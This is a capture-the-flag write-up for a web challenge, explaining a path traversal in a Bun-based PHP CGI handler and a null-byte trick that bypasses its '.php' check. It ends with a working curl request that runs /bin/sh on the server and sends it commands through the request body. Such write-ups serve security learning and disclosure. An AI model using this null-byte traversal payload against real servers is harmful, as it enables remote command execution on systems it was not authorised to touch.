# Bun.PHP

* Category: Web
* Score: 100/500
* Solves: 55/82

## Description

Sadly [this](https://x.com/thdxr/status/1958246871861715108) is just a meme, but we can always run PHP in CGI mode!

## Overview

This application contains a trivial path traversal vulnerability in its CGI implementation:
```javascript
        // omitted
        "/cgi-bin/:filename": async req => {
            const filename = req.params.filename;
            if (!filename.endsWith(".php")) {
                return new Response(`404\n`, {
                    status: 404,
                    headers: { "Content-Type": "text/plain" },
                });
            }

            const scriptPath = resolve("cgi-bin/" + filename);
            const body = await req.blob();
            const shell = $`${scriptPath} < ${body}`
                .env({
                    REQUEST_METHOD: req.method,
                    QUERY_STRING: new URL(req.url).searchParams.toString(),
                    CONTENT_TYPE: req.headers.get("content-type") ?? "",
                    CONTENT_LENGTH: body ? String(body.size) : "0",
                    SCRIPT_FILENAME: scriptPath,
                    GATEWAY_INTERFACE: "CGI/1.1",
                    SERVER_PROTOCOL: "HTTP/1.1",
                    SERVER_SOFTWARE: "bun-php-server/0.1",
                    REDIRECT_STATUS: "200",
                })
                .nothrow();
            // omitted
        }
```

However, there's a check to ensure that only filenames ending with `.php` can be executed.

We need to bypass this check to execute arbitrary commands, specifically `/readflag give me the flag`.

## Solution

Bun 1.3.5 allows passing null bytes to the command-line arguments.

For example, the following code will not throw an error:
```javascript
import { $ } from "bun";
await $`${"id\x00.php"}`;
```

So when `execve` is called under the hood, the filename will be interpreted as `id`, effectively bypassing the `.php` check.

> I reported the issue to the Bun team shortly after the CTF. They promptly addressed it in [this PR](https://github.com/oven-sh/bun/pull/25698).
> Many thanks to the Bun team for their quick response and fix!

By abusing this fact, we can bypass the filename check and execute arbitrary executables using path traversal. For example, we can run `/bin/sh` by accessing `/cgi-bin/..%2f..%2f..%2f..%2fbin%2fsh%00.php`.

Moreover, since the request body is passed as standard input, we can send commands to `/bin/sh` through the request body.

Combining these techniques, we can read the flag with the following command:
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Length: 44' \
    --data-binary $'printf \'\\r\\n\\r\\n\';/readflag give me the flag' \
    $'http://127.0.0.1:1337/cgi-bin/..%2f..%2f..%2f..%2fbin%2fsh%00.php'
```
